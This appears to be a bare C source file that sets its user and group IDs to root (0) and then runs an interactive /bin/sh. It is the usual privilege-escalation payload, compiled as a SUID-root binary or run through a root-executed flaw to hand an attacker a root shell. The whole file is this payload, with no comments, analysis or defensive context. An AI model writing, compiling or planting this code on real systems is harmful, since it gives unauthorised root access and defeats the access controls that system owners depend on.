#include <unistd.h>

int main() {
    char *args[] = { "/bin/sh", "-i", NULL };
    setgid(0);
    setuid(0);
    execve("/bin/sh", args, NULL);

    return 0;
}